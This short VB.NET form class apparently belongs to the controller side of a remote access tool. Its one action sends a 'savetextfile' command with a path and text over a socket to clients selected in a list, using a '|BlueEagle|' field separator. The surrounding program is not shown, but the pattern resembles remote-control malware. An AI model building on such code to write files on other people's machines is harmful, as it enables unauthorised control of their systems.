Public Class TextEditor
    Public sock As Integer
    Public pathoftext As String
    Public yy As String = "|BlueEagle|"

    Private Sub TextEditor_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "savetextfile" & yy & pathoftext & yy & TextBox1.Text)
        Next
    End Sub

    Private Sub SkyDarkButton2_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton2.Click
        Me.Close()
    End Sub
End Class